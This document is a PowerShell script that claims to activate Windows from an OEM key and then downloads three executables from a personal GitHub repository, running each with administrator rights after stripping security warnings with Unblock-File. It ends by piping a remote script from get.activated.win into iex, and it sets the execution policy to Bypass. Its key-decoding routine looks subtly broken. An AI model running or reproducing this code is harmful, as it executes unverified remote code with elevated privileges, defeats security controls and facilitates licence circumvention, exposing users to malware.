# Check for administrative privileges
function Test-IsAdmin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Ensure the script runs with administrative privileges
if (-not (Test-IsAdmin)) {
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show("This script requires administrative privileges. Please run as administrator.", "Admin Rights Required", "OK", "Error")
    exit
}

# Ensure the script can bypass execution policy restrictions
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

function Get-WindowsOEMProductKey {
    try {
        $Path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform"
        $DigitalProductId = (Get-ItemProperty -Path $Path -ErrorAction Stop).DigitalProductId

        if (-not $DigitalProductId) {
            throw "No OEM product key found in BIOS."
        }

        # Extract the product key
        $key = (1..15 | ForEach-Object {
            $dpid = $DigitalProductId[52..66]
            $dpid[($dpid.Length - 1) - ($_ - 1)]
        }) -join ""

        # Decode the product key
        $chars = "BCDFGHJKMPQRTVWXY2346789"
        $keyChars = $key.ToCharArray()
        for ($i = 24; $i -ge 0; $i--) {
            $current = 0
            for ($j = 14; $j -ge 0; $j--) {
                $current = $current * 256 -bxor [int]$keyChars[$j]
                $keyChars[$j] = [char]($current / 24)
                $current = $current % 24
            }
            $key = ($chars[$current]) + $key
            if (($i % 5) -eq 4 -and $i -ne 0) {
                $key = "-" + $key
            }
        }
        return $key
    } catch {
        Write-Error "An error occurred while retrieving the product key: $_"
    }
}

function Activate-Windows {
    param (
        [string]$ProductKey
    )
    try {
        if (-not $ProductKey) {
            throw "No product key provided."
        }

        # Set the product key
        cscript.exe //NoLogo C:\Windows\System32\slmgr.vbs /ipk $ProductKey
        # Activate Windows
        cscript.exe //NoLogo C:\Windows\System32\slmgr.vbs /ato

        Write-Output "Windows has been activated successfully with the OEM Product Key: $ProductKey"
    } catch {
        Write-Error "An error occurred while activating Windows: $_"
    }
}

# Main script execution
$key = Get-WindowsOEMProductKey
if ($key) {
    Activate-Windows -ProductKey $key
} else {
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show("No OEM product key found in BIOS.", "Product Key Not Found", "OK", "Error")
}

function DownloadAndRun-Executable {
    param (
        [string] $url
    )

    try {
        # Create a temporary file path with the .exe extension
        $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetRandomFileName() + ".exe")
        
        Write-Output "Downloading executable from $url to $tempFilePath"
        
        # Download the executable from the provided URL
        iwr $url -OutFile $tempFilePath -ErrorAction Stop
        
        Write-Output "Download complete. Unblocking file."

        # Unblock the downloaded file to prevent security warnings
        Unblock-File -Path $tempFilePath -ErrorAction Stop

        Write-Output "Unblocked file. Running executable with admin privileges."

        # Run the executable with administrator rights
        $process = Start-Process -FilePath $tempFilePath -Verb RunAs -PassThru -Wait

        # Log the exit code
        Write-Output "Executable completed with exit code: $($process.ExitCode)"

        # Clean up: Delete the temporary file after execution
        Remove-Item -Path $tempFilePath -Force
        
        Write-Output "Temporary file deleted."
    }
    catch {
        Write-Error "Failed to download or run executable from $url. Error: $_"
    }
}

function Execute-RemoteScript {
    param (
        [string] $url
    )

    try {
        Write-Output "Executing remote script from $url"
        
        # Fetch and execute the remote script
        iwr $url | iex
    }
    catch {
        Write-Error "Failed to execute remote script from $url. Error: $_"
    }
}

# URLs of the executables to download and run
$urls = @(
    'https://github.com/Zigsaw07/office2024/raw/main/MSO-365.exe',
    'https://github.com/Zigsaw07/office2024/raw/main/Ninite.exe',
    'https://github.com/Zigsaw07/office2024/raw/main/RAR.exe'
)

# URL of the remote script to execute
$remoteScriptUrl = 'https://get.activated.win'

# Loop through each URL and execute the download and run function
foreach ($url in $urls) {
    DownloadAndRun-Executable -url $url
}

# Execute the remote script
Execute-RemoteScript -url $remoteScriptUrl
